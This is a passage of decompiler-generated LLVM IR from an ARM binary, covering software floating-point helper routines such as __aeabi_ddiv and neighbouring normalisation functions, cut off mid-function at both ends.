bb41:                                             ; preds = %dec_label_pc_1f1a8
  %v2_1f1c8 = or i32 %v15_1f1b8, 1
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_1f1a8, %bb41
  %storemerge = phi i32 [ %v2_1f1c8, %bb41 ], [ %v15_1f1b8, %dec_label_pc_1f1a8 ]
  %v0_1f1dc = phi i32 [ %v2_1f1c8, %bb41 ], [ %v15_1f1b8, %dec_label_pc_1f1a8 ]
  store i32 %storemerge, i32* %lr.global-to-local, align 4
  %v1_1f1cc = add i32 %v2_1f184, -255
  %v2_1f1d0 = icmp ugt i32 %v13_1f1c0, 511
  %v2_1f1d4 = icmp eq i1 %v2_1f1d0, false
  %v3_1f1d4 = add i32 %v2_1f184, -1023
  %v5_1f1d4 = sext i1 %v2_1f1d4 to i32
  %v6_1f1d4 = add i32 %v3_1f1d4, %v5_1f1d4
  store i32 %v6_1f1d4, i32* %r4.global-to-local, align 4
  %v3_1f1d8 = icmp ugt i32 %v1_1f1cc, 768
  br i1 %v3_1f1d8, label %dec_label_pc_1f1e8, label %dec_label_pc_1f1dc

dec_label_pc_1f1dc:                               ; preds = %bb42
  %v1_1f1dc = icmp slt i32 %v0_1f1dc, 0
  %v2_1f1dc = mul i32 %v0_1f1dc, 2
  store i32 %v2_1f1dc, i32* %lr.global-to-local, align 4
  %v3_1f1e0 = mul i32 %v14_1f1c0, 2
  %v4_1f1e0 = zext i1 %v1_1f1dc to i32
  %v5_1f1e0 = or i32 %v4_1f1e0, %v3_1f1e0
  %v9_1f1e0 = icmp ule i32 %v5_1f1e0, %v14_1f1c0
  %v10_1f1e0 = icmp ult i32 %v3_1f1e0, %v14_1f1c0
  %v11_1f1e0 = select i1 %v1_1f1dc, i1 %v9_1f1e0, i1 %v10_1f1e0
  %v3_1f1e425 = mul nuw nsw i64 %v12_1f1c0, 2
  %v3_1f1e4 = trunc i64 %v3_1f1e425 to i32
  %v4_1f1e4 = zext i1 %v11_1f1e0 to i32
  %v5_1f1e4 = or i32 %v4_1f1e4, %v3_1f1e4
  br label %dec_label_pc_1f1e8

dec_label_pc_1f1e8:                               ; preds = %bb42, %dec_label_pc_1f1dc
  %v0_1f1f8 = phi i32 [ %v0_1f1dc, %bb42 ], [ %v2_1f1dc, %dec_label_pc_1f1dc ]
  %v0_1f1f0 = phi i32 [ %v14_1f1c0, %bb42 ], [ %v5_1f1e0, %dec_label_pc_1f1dc ]
  %v1_1f1e8 = phi i32 [ %v13_1f1c0, %bb42 ], [ %v5_1f1e4, %dec_label_pc_1f1dc ]
  %v4_1f1e8 = mul i32 %v1_1f1e8, 2048
  %v4_1f1ec = udiv i32 %v0_1f1f0, 2097152
  %v5_1f1e8 = or i32 %v4_1f1ec, %v1_1f1b4
  %v5_1f1ec = or i32 %v5_1f1e8, %v4_1f1e8
  store i32 %v5_1f1ec, i32* %r1.global-to-local, align 4
  %v3_1f1f0 = mul i32 %v0_1f1f0, 2048
  %v4_1f1f4 = udiv i32 %v0_1f1f8, 2097152
  %v5_1f1f4 = or i32 %v3_1f1f0, %v4_1f1f4
  store i32 %v5_1f1f4, i32* %r0.global-to-local, align 4
  %v3_1f1f8 = mul i32 %v0_1f1f8, 2048
  store i32 %v3_1f1f8, i32* %lr.global-to-local, align 4
  %v1_1f1fc = add i32 %v6_1f1d4, -253
  store i32 %v1_1f1fc, i32* %ip.global-to-local, align 4
  %v2_1f1fc = icmp ugt i32 %v6_1f1d4, 252
  %v7_1f1fc = icmp eq i32 %v6_1f1d4, 253
  %v2_1f200 = xor i1 %v7_1f1fc, true
  %v3_1f200 = and i1 %v2_1f1fc, %v2_1f200
  br i1 %v3_1f200, label %bb43, label %bb44

bb43:                                             ; preds = %dec_label_pc_1f1e8
  %v6_1f200 = icmp ugt i32 %v1_1f1fc, 1791
  %v11_1f200 = icmp eq i32 %v1_1f1fc, 1792
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_1f1e8, %bb43
  %v1_1f204 = phi i1 [ %v7_1f1fc, %dec_label_pc_1f1e8 ], [ %v11_1f200, %bb43 ]
  %v0_1f204 = phi i1 [ %v2_1f1fc, %dec_label_pc_1f1e8 ], [ %v6_1f200, %bb43 ]
  %v2_1f204 = xor i1 %v1_1f204, true
  %v3_1f204 = and i1 %v0_1f204, %v2_1f204
  call void @__pseudo_cond_branch(i1 %v3_1f204, i32 ptrtoint (i32* @global_var_1f250.1285 to i32))
  %v0_1f208 = load i32, i32* %lr.global-to-local, align 4
  %v2_1f208 = icmp slt i32 %v0_1f208, 0
  %v6_1f208 = icmp eq i32 %v0_1f208, -2147483648
  %v1_1f20c = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_1f208, label %bb45, label %._crit_edge

bb45:                                             ; preds = %bb44
  %v2_1f20c = urem i32 %v1_1f20c, 2
  %v3_1f20c = icmp ne i32 %v2_1f20c, 0
  %v4_1f20c = udiv i32 %v1_1f20c, 2
  store i32 %v4_1f20c, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb44, %bb45
  %v1_1f210 = phi i1 [ %v3_1f20c, %bb45 ], [ %v2_1f208, %bb44 ]
  %v2_1f210 = zext i1 %v1_1f210 to i32
  %v3_1f210 = add i32 %v2_1f210, %v1_1f20c
  store i32 %v3_1f210, i32* %r0.global-to-local, align 4
  %v0_1f214 = load i32, i32* %r1.global-to-local, align 4
  %v1_1f214 = load i32, i32* %r4.global-to-local, align 4
  %v2_1f214 = and i32 %v1_1f214, 4096
  %v3_1f214 = icmp ne i32 %v2_1f214, 0
  %v4_1f214 = mul i32 %v1_1f214, 1048576
  %v6_1f214 = add i32 %v4_1f214, %v0_1f214
  %v7_1f214 = zext i1 %v3_1f214 to i32
  %v8_1f214 = add i32 %v7_1f214, %v6_1f214
  store i32 %v8_1f214, i32* %r1.global-to-local, align 4
  %v2_1f218 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1f218, i32* %r4.global-to-local, align 4
  store i32 %v12_1f164, i32* %lr.global-to-local, align 4
  ret i32 %v3_1f210

dec_label_pc_1f220:                               ; preds = %.thread3, %bb40
  %v1_1f22c = phi i32 [ %v1_1f1a07, %.thread3 ], [ %v1_1f1a0, %bb40 ]
  %v1_1f224 = phi i32 [ %v1_1f19c5, %.thread3 ], [ %v1_1f19c, %bb40 ]
  %v1_1f220 = and i32 %v2_1f188, -2147483648
  %v2_1f224 = or i32 %v1_1f224, %v1_1f220
  %v4_1f2281 = or i64 %tmp, %arg1
  %v4_1f228 = trunc i64 %v4_1f2281 to i32
  store i32 %v4_1f228, i32* %r0.global-to-local, align 4
  %v2_1f22c = xor i32 %v2_1f224, %v1_1f22c
  store i32 %v2_1f22c, i32* %r1.global-to-local, align 4
  %v4_1f230 = udiv i32 %v1_1f18c, 2
  %v5_1f230 = sub i32 %v2_1f184, %v4_1f230
  store i32 %v5_1f230, i32* %r4.global-to-local, align 4
  %v7_1f230 = sub i32 0, %v5_1f230
  %v8_1f230 = and i32 %v2_1f184, %v7_1f230
  %v11_1f230 = icmp eq i32 %v2_1f184, %v4_1f230
  %v7_1f234 = icmp sgt i32 %v2_1f184, %v4_1f230
  br i1 %v7_1f234, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_1f220
  %v10_1f234 = sub i32 %v1_1f18c, %v5_1f230
  %v12_1f234 = xor i32 %v5_1f230, %v1_1f18c
  %v13_1f234 = xor i32 %v10_1f234, %v1_1f18c
  %v14_1f234 = and i32 %v13_1f234, %v12_1f234
  %v17_1f234 = icmp eq i32 %v1_1f18c, %v5_1f230
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_1f220, %bb46
  %v3_1f240.in = phi i32 [ %v8_1f230, %dec_label_pc_1f220 ], [ %v14_1f234, %bb46 ]
  %v2_1f240.in = phi i32 [ %v5_1f230, %dec_label_pc_1f220 ], [ %v10_1f234, %bb46 ]
  %v1_1f240 = phi i1 [ %v11_1f230, %dec_label_pc_1f220 ], [ %v17_1f234, %bb46 ]
  %v2_1f240 = icmp slt i32 %v2_1f240.in, 0
  %v3_1f240 = icmp slt i32 %v3_1f240.in, 0
  %v3_1f238 = xor i1 %v3_1f240, %v2_1f240
  %v4_1f238 = or i1 %v1_1f240, %v3_1f238
  br i1 %v4_1f238, label %._crit_edge23, label %bb48

._crit_edge23:                                    ; preds = %bb47
  %v0_1f240.pre = load i32, i32* %lr.global-to-local, align 4
  br label %bb49

bb48:                                             ; preds = %bb47
  %v9_1f23830 = mul i32 %v5_1f230, 1048576
  %v10_1f23831 = or i32 %v2_1f22c, %v9_1f23830
  store i32 %v10_1f23831, i32* %r1.global-to-local, align 4
  %v7_1f23c = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_1f23c, i32* %r4.global-to-local, align 4
  store i32 %v12_1f164, i32* %lr.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %._crit_edge23, %bb48
  %v0_1f240 = phi i32 [ %v0_1f240.pre, %._crit_edge23 ], [ %v12_1f164, %bb48 ]
  %v6_1f240 = xor i1 %v4_1f238, true
  call void @__pseudo_cond_branch(i1 %v6_1f240, i32 %v0_1f240)
  %v0_1f244 = load i32, i32* %r1.global-to-local, align 4
  %v1_1f244 = or i32 %v0_1f244, 1048576
  store i32 %v1_1f244, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_1f24c = load i32, i32* %r4.global-to-local, align 4
  %v1_1f24c = add i32 %v0_1f24c, -1
  store i32 %v1_1f24c, i32* %r4.global-to-local, align 4
  ret i32 %v4_1f228

; uselistorder directives
  uselistorder i32 %v5_1f230, { 1, 0, 5, 3, 4, 2, 6 }
  uselistorder i32 %v4_1f230, { 2, 1, 0 }
  uselistorder i32 %v1_1f20c, { 2, 0, 1 }
  uselistorder i32 %v0_1f208, { 1, 0 }
  uselistorder i1 %v7_1f1fc, { 1, 0 }
  uselistorder i32 %v2_1f1dc, { 1, 0 }
  uselistorder i1 %v1_1f1dc, { 1, 0 }
  uselistorder i32 %v6_1f1d4, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1f1dc, { 1, 0, 2 }
  uselistorder i32 %v14_1f1c0, { 1, 3, 2, 0 }
  uselistorder i64 %v11_1f1c0, { 1, 0 }
  uselistorder i64 %v12_1f1b8, { 1, 0 }
  uselistorder i64 %v10_1f1b8, { 1, 0 }
  uselistorder i64 %v7_1f1b0, { 1, 0 }
  uselistorder i64 %v6_1f1a8, { 1, 0 }
  uselistorder i32 %v6_1f190, { 1, 0 }
  uselistorder i32 %v6_1f18c, { 1, 0, 2 }
  uselistorder i32 %v1_1f18c, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_1f184, { 4, 3, 0, 2, 1, 5, 6 }
  uselistorder i32 %v6_1f174, { 2, 1, 0 }
  uselistorder i32 %v5_1f170, { 2, 1, 0 }
  uselistorder i32 %v12_1f164, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 10, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i32 -255, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %arg4, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_1f220, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_1f1e8, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %.thread2, { 3, 2, 1, 0 }
}

define i32 @function_1f250() local_unnamed_addr {
dec_label_pc_1f250:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  %v0_1f250 = load i1, i1* @cpsr_z, align 1
  %v1_1f250 = load i1, i1* @cpsr_n, align 1
  %v2_1f250 = load i1, i1* @cpsr_v, align 1
  %v3_1f250 = xor i1 %v1_1f250, %v2_1f250
  %v4_1f250 = or i1 %v0_1f250, %v3_1f250
  br i1 %v4_1f250, label %dec_label_pc_1f254, label %dec_label_pc_1f3cc

dec_label_pc_1f254:                               ; preds = %dec_label_pc_1f250
  %v0_1f254 = load i32, i32* @r4, align 4
  %v4_1f254 = add i32 %v0_1f254, 54
  %v6_1f254 = sub i32 0, %v0_1f254
  %v7_1f254 = and i32 %v4_1f254, %v6_1f254
  %v8_1f254 = icmp slt i32 %v7_1f254, 0
  %v9_1f254 = icmp slt i32 %v4_1f254, 0
  %v10_1f254 = icmp eq i32 %v4_1f254, 0
  %v7_1f258 = icmp sgt i32 %v0_1f254, -54
  br i1 %v7_1f258, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_1f254
  store i32 0, i32* @r0, align 4
  %v8_1f25c = load i32, i32* @r1, align 4
  %v9_1f25c = and i32 %v8_1f25c, -2147483648
  store i32 %v9_1f25c, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1f254, %bb
  %v4_1f264 = xor i1 %v9_1f254, %v8_1f254
  %v5_1f264 = or i1 %v10_1f254, %v4_1f264
  call void @__pseudo_cond_branch(i1 %v5_1f264, i32 %tmp7)
  %v0_1f268 = load i32, i32* @r4, align 4
  %v1_1f268 = sub i32 0, %v0_1f268
  %v2_1f26c = sub i32 -32, %v0_1f268
  %v4_1f26c = add i32 %v0_1f268, 31
  %v5_1f26c = and i32 %v4_1f26c, %v1_1f268
  %v6_1f26c = icmp slt i32 %v5_1f26c, 0
  store i1 %v6_1f26c, i1* @cpsr_v, align 1
  %v6_1f270 = icmp slt i32 %v1_1f268, 32
  br i1 %v6_1f270, label %dec_label_pc_1f274, label %dec_label_pc_1f2e0

dec_label_pc_1f274:                               ; preds = %.thread1
  %v1_1f274 = add i32 %v2_1f26c, 12
  %v8_1f278 = icmp sgt i32 %v1_1f274, 0
  br i1 %v8_1f278, label %dec_label_pc_1f2b0, label %dec_label_pc_1f27c

dec_label_pc_1f27c:                               ; preds = %dec_label_pc_1f274
  %v1_1f27c = add i32 %v2_1f26c, 32
  %v1_1f280 = sub i32 0, %v2_1f26c
  %v0_1f284 = load i32, i32* @r0, align 4
  %v6_1f284 = shl i32 %v0_1f284, %v1_1f280
  %v2_1f288 = add i32 %v2_1f26c, 31
  %v3_1f288 = shl i32 1, %v2_1f288
  %v6_1f288 = lshr i32 %v0_1f284, %v1_1f27c
  %v1_1f28c = load i32, i32* @r1, align 4
  %v7_1f28c = shl i32 %v1_1f28c, %v1_1f280
  %v8_1f28c = or i32 %v7_1f28c, %v6_1f288
  %v1_1f290 = and i32 %v1_1f28c, -2147483648
  %tmp = bitcast i32 %v1_1f28c to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_1f294 = bitcast float %tmp19 to i32
  %tmp20 = icmp slt i32 %v6_1f284, 0
  %v4_1f298 = zext i1 %tmp20 to i32
  %v5_1f298 = add i32 %v8_1f28c, %v4_1f298
  %v5_1f29c = and i32 %v1_1f294, %v3_1f288
  %v6_1f29c = icmp ne i32 %v5_1f29c, 0
  %v7_1f29c = lshr i32 %v1_1f294, %v1_1f27c
  %v9_1f29c = add i32 %v7_1f29c, %v1_1f290
  %v10_1f29c = zext i1 %v6_1f29c to i32
  %v11_1f29c = add i32 %v9_1f29c, %v10_1f29c
  store i32 %v11_1f29c, i32* @r1, align 4
  %v19_1f29c = add i32 %v11_1f29c, %v10_1f29c
  %v20_1f29c = xor i32 %v19_1f29c, %v1_1f28c
  %v21_1f29c = xor i32 %v19_1f29c, %v7_1f29c
  %v22_1f29c = and i32 %v20_1f29c, %v21_1f29c
  %v23_1f29c = icmp slt i32 %v22_1f29c, 0
  store i1 %v23_1f29c, i1* @cpsr_v, align 1
  %v3_1f2a0 = mul i32 %v6_1f284, 2
  %v4_1f2a0 = or i32 %v3_1f2a0, %tmp7
  %v5_1f2a0 = icmp slt i32 %v4_1f2a0, 0
  store i1 %v5_1f2a0, i1* @cpsr_n, align 1
  %v6_1f2a0 = icmp eq i32 %v4_1f2a0, 0
  store i1 %v6_1f2a0, i1* @cpsr_z, align 1
  br i1 %v6_1f2a0, label %bb13, label %bb14

bb13:                                             ; preds = %dec_label_pc_1f27c
  %tmp21 = sext i1 %tmp20 to i32
  %v6_1f2a4 = add nsw i32 %tmp21, -1
  %v7_1f2a4 = and i32 %v5_1f298, %v6_1f2a4
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_1f27c, %bb13
  %v1_1f2ac = phi i32 [ %v5_1f298, %dec_label_pc_1f27c ], [ %v7_1f2a4, %bb13 ]
  %v2_1f2a8 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1f2a8, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1f2ac

dec_label_pc_1f2b0:                               ; preds = %dec_label_pc_1f274
  %v1_1f2b0 = sub i32 0, %v2_1f26c
  %v1_1f2b4 = add i32 %v2_1f26c, 32
  %v0_1f2b8 = load i32, i32* @r0, align 4
  %v6_1f2b8 = shl i32 %v0_1f2b8, %v1_1f2b0
  %v6_1f2bc = lshr i32 %v0_1f2b8, %v1_1f2b4
  %v1_1f2c0 = load i32, i32* @r1, align 4
  %v7_1f2c0 = shl i32 %v1_1f2c0, %v1_1f2b0
  %v8_1f2c0 = or i32 %v7_1f2c0, %v6_1f2bc
  %v1_1f2c4 = and i32 %v1_1f2c0, -2147483648
  %tmp22 = icmp slt i32 %v6_1f2b8, 0
  %v4_1f2c8 = zext i1 %tmp22 to i32
  %v5_1f2c8 = add i32 %v8_1f2c0, %v4_1f2c8
  %v6_1f2c8 = icmp ult i32 %v5_1f2c8, %v8_1f2c0
  %v2_1f2cc = zext i1 %v6_1f2c8 to i32
  %v3_1f2cc = or i32 %v2_1f2cc, %v1_1f2c4
  store i32 %v3_1f2cc, i32* @r1, align 4
  %v9_1f2cc = add nsw i32 %v3_1f2cc, %v2_1f2cc
  %v10_1f2cc = sub i32 0, %v1_1f2c0
  %v11_1f2cc = and i32 %v9_1f2cc, %v10_1f2cc
  %v12_1f2cc = icmp slt i32 %v11_1f2cc, 0
  store i1 %v12_1f2cc, i1* @cpsr_v, align 1
  %v3_1f2d0 = mul i32 %v6_1f2b8, 2
  %v4_1f2d0 = or i32 %v3_1f2d0, %tmp7
  %v5_1f2d0 = icmp slt i32 %v4_1f2d0, 0
  store i1 %v5_1f2d0, i1* @cpsr_n, align 1
  %v6_1f2d0 = icmp eq i32 %v4_1f2d0, 0
  store i1 %v6_1f2d0, i1* @cpsr_z, align 1
  br i1 %v6_1f2d0, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_1f2b0
  %tmp23 = sext i1 %tmp22 to i32
  %v6_1f2d4 = add nsw i32 %tmp23, -1
  %v7_1f2d4 = and i32 %v5_1f2c8, %v6_1f2d4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1f2b0, %bb15
  %v1_1f2dc = phi i32 [ %v5_1f2c8, %dec_label_pc_1f2b0 ], [ %v7_1f2d4, %bb15 ]
  %v2_1f2d8 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1f2d8, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1f2dc

dec_label_pc_1f2e0:                               ; preds = %.thread1
  %v1_1f2e0 = sub i32 32, %v2_1f26c
  %v1_1f2e4 = load i32, i32* @r0, align 4
  %v7_1f2e4 = shl i32 %v1_1f2e4, %v1_1f2e0
  %v8_1f2e4 = or i32 %v7_1f2e4, %tmp7
  %v6_1f2e8 = lshr i32 %v1_1f2e4, %v2_1f26c
  %v1_1f2ec = load i32, i32* @r1, align 4
  %v7_1f2ec = shl i32 %v1_1f2ec, %v1_1f2e0
  %v8_1f2ec = or i32 %v7_1f2ec, %v6_1f2e8
  %v6_1f2f0 = lshr i32 %v1_1f2ec, %v2_1f26c
  %v1_1f2f4 = and i32 %v1_1f2ec, -2147483648
  store i32 %v1_1f2f4, i32* @r1, align 4
  %v7_1f2f8 = lshr i32 %v1_1f2f4, %v2_1f26c
  %v8_1f2f8 = sub i32 -1, %v7_1f2f8
  %v9_1f2f8 = and i32 %v6_1f2f0, %v8_1f2f8
  %tmp24 = icmp slt i32 %v8_1f2ec, 0
  %v4_1f2fc = zext i1 %tmp24 to i32
  %v5_1f2fc = add i32 %v4_1f2fc, %v9_1f2f8
  %v3_1f300 = mul i32 %v8_1f2ec, 2
  %v4_1f300 = or i32 %v8_1f2e4, %v3_1f300
  %v5_1f300 = icmp slt i32 %v4_1f300, 0
  store i1 %v5_1f300, i1* @cpsr_n, align 1
  %v6_1f300 = icmp eq i32 %v4_1f300, 0
  store i1 %v6_1f300, i1* @cpsr_z, align 1
  br i1 %v6_1f300, label %bb17, label %bb18

bb17:                                             ; preds = %dec_label_pc_1f2e0
  %tmp25 = sext i1 %tmp24 to i32
  %v6_1f304 = add nsw i32 %tmp25, -1
  %v7_1f304 = and i32 %v5_1f2fc, %v6_1f304
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1f2e0, %bb17
  %v1_1f30c = phi i32 [ %v5_1f2fc, %dec_label_pc_1f2e0 ], [ %v7_1f304, %bb17 ]
  %v2_1f308 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1f308, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1f30c

dec_label_pc_1f3cc:                               ; preds = %dec_label_pc_1f250
  %v0_1f3cc = load i32, i32* @r1, align 4
  %v1_1f3cc = and i32 %v0_1f3cc, -2147483648
  %v1_1f3d4 = or i32 %v1_1f3cc, 2146435072
  store i32 %v1_1f3d4, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v5_1f2fc, { 1, 0 }
  uselistorder i32 %v5_1f2c8, { 1, 0, 2 }
  uselistorder i32 %v8_1f2c0, { 1, 0 }
  uselistorder i32 %v1_1f2b0, { 1, 0 }
  uselistorder i32 %v5_1f298, { 1, 0 }
  uselistorder i32 %v1_1f28c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1f280, { 1, 0 }
  uselistorder i32 %v2_1f26c, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_1f268, { 1, 0 }
  uselistorder i32 %v4_1f254, { 1, 2, 0 }
  uselistorder i32 %v0_1f254, { 1, 0, 2 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32 %tmp5, { 2, 1, 0 }
  uselistorder i32 12, { 59, 60, 61, 68, 8, 69, 72, 3, 1, 2, 73, 74, 5, 0, 4, 84, 27, 10, 31, 11, 12, 70, 71, 28, 29, 30, 75, 76, 77, 78, 79, 13, 80, 67, 14, 85, 86, 9, 140, 141, 142, 143, 144, 146, 147, 145, 148, 149, 150, 151, 152, 153, 154, 15, 16, 17, 18, 20, 19, 21, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 81, 82, 22, 23, 62, 63, 64, 65, 66, 32, 33, 24, 34, 35, 36, 52, 57, 37, 38, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 6, 25, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 136, 129, 130, 131, 132, 133, 134, 135, 137, 138, 26, 139, 83, 7, 100, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 54, 55, 56, 58 }
  uselistorder i32 -32, { 4, 3, 5, 9, 10, 14, 11, 15, 16, 0, 12, 2, 13, 6, 8, 7, 1, 17 }
  uselistorder i32 54, { 3, 0, 1, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_1f3e4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1f3e4:
  %v1_1f3e8 = or i32 %arg1, 2146959360
  store i32 %v1_1f3e8, i32* @r1, align 4
  %v1_1f3f0 = load i32, i32* @r0, align 4
  ret i32 %v1_1f3f0
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1f3f4 = load i32, i32* @r4, align 4
  store i32 %v3_1f3f4, i32* %stack_var_-16, align 4
  %v6_1f3f4 = load i32, i32* @r5, align 4
  %v9_1f3f4 = load i32, i32* @r6, align 4
  %v12_1f3f4 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_1f400 = load i32, i32* @r1, align 4
  %v4_1f400 = udiv i32 %v1_1f400, 1048576
  %v5_1f400 = urem i32 %v4_1f400, 2048
  store i32 %v5_1f400, i32* @r4, align 4
  %v6_1f400 = icmp eq i32 %v5_1f400, 0
  br i1 %v6_1f400, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre147 = udiv i32 %arg4, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_1f404 = udiv i32 %arg4, 1048576
  %v6_1f404 = urem i32 %v5_1f404, 2048
  store i32 %v6_1f404, i32* %r5.global-to-local, align 4
  %v7_1f404 = icmp eq i32 %v6_1f404, 0
  br i1 %v7_1f404, label %.thread1, label %bb90

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_1f590

bb90:                                             ; preds = %bb
  %v5_1f408 = icmp eq i32 %v5_1f400, 2047
  br i1 %v5_1f408, label %.thread2, label %bb91

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb90
  %.pre145.pre-phi = phi i32 [ %.pre147, %entry..thread2_crit_edge ], [ %v5_1f404, %bb90 ]
  br label %dec_label_pc_1f590

bb91:                                             ; preds = %bb90
  %v5_1f40c = icmp eq i32 %v6_1f404, 2047
  br i1 %v5_1f40c, label %dec_label_pc_1f590, label %dec_label_pc_1f414

dec_label_pc_1f414:                               ; preds = %bb91
  %v2_1f414 = sub nsw i32 %v5_1f400, %v6_1f404
  store i32 %v2_1f414, i32* %r4.global-to-local, align 4
  %v2_1f418 = xor i32 %v1_1f400, %arg4
  %v4_1f41c = mul i32 %arg4, 4096
  %v5_1f41c = or i32 %v4_1f41c, %arg3
  store i32 %v5_1f41c, i32* %r5.global-to-local, align 4
  %v7_1f41c = icmp eq i32 %v5_1f41c, 0
  %v3_1f420 = mul i32 %v1_1f400, 4096
  store i32 %v3_1f420, i32* %r1.global-to-local, align 4
  br i1 %v7_1f41c, label %dec_label_pc_1f55c, label %dec_label_pc_1f428

dec_label_pc_1f428:                               ; preds = %dec_label_pc_1f414
  %tmp92 = mul i32 %arg4, 256
  %v4_1f430 = and i32 %tmp92, 268435200
  %v4_1f434 = udiv i32 %arg3, 16777216
  %v5_1f430 = or i32 %v4_1f434, %v4_1f430
  %v5_1f434 = or i32 %v5_1f430, 268435456
  store i32 %v5_1f434, i32* %r3.global-to-local, align 4
  %v3_1f438 = mul i32 %arg3, 256
  store i32 %v3_1f438, i32* %r2.global-to-local, align 4
  %tmp93 = mul i32 %v1_1f400, 256
  %v4_1f43c = and i32 %tmp93, 268435200
  %v1_1f440 = load i32, i32* @r0, align 4
  %v4_1f440 = udiv i32 %v1_1f440, 16777216
  %v5_1f43c = or i32 %v4_1f43c, %v4_1f440
  %v5_1f440 = or i32 %v5_1f43c, 268435456
  store i32 %v5_1f440, i32* %r5.global-to-local, align 4
  %v3_1f444 = mul i32 %v1_1f440, 256
  store i32 %v3_1f444, i32* %r6.global-to-local, align 4
  %v1_1f448 = and i32 %v2_1f418, -2147483648
  store i32 %v1_1f448, i32* %r1.global-to-local, align 4
  %v3_1f44c = icmp uge i32 %v5_1f440, %v5_1f434
  %v9_1f44c = icmp eq i32 %v5_1f440, %v5_1f434
  br i1 %v9_1f44c, label %bb94, label %bb95

bb94:                                             ; preds = %dec_label_pc_1f428
  %v4_1f450 = icmp uge i32 %v3_1f444, %v3_1f438
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_1f428, %bb94
  %v1_1f454 = phi i1 [ %v3_1f44c, %dec_label_pc_1f428 ], [ %v4_1f450, %bb94 ]
  %v2_1f454 = add nsw i32 %v2_1f414, 253
  %v3_1f454 = zext i1 %v1_1f454 to i32
  %v4_1f454 = add nsw i32 %v2_1f454, %v3_1f454
  %v8_1f454 = icmp ule i32 %v4_1f454, %v2_1f414
  %v9_1f454 = icmp ugt i32 %v2_1f414, -254
